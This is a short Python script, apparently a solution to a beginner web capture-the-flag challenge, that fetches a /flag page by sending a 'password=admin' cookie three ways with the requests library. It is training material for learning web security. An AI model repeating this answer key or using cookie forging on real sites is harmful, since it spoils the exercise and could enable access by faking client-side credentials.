#!/usr/bin/env python3

import requests

def print_response(response):
    # Check if the request was successful (status code 200)
    if response.status_code == 200:
        print(response.text)
    else:
        print('Failed to retrieve the webpage. Status code:', response.status_code)

# Define the URL of the website you want to scrape
url = 'http://web-05.challs.olicyber.it/flag'

# set cookie with name password and value admin valid only for url
headers = { 'Cookie': 'password=admin' }
# Send an HTTP GET request to the URL
response = requests.get(url, headers=headers)
print_response(response)

# or 
cookies = { 'password': 'admin' }
response = requests.get(url, cookies=cookies)
print_response(response)

# or better
jar = requests.cookies.RequestsCookieJar()
jar.set('password', 'admin', domain='web-05.challs.olicyber.it', path='/flag')
response = requests.get(url, cookies=jar)
print_response(response)



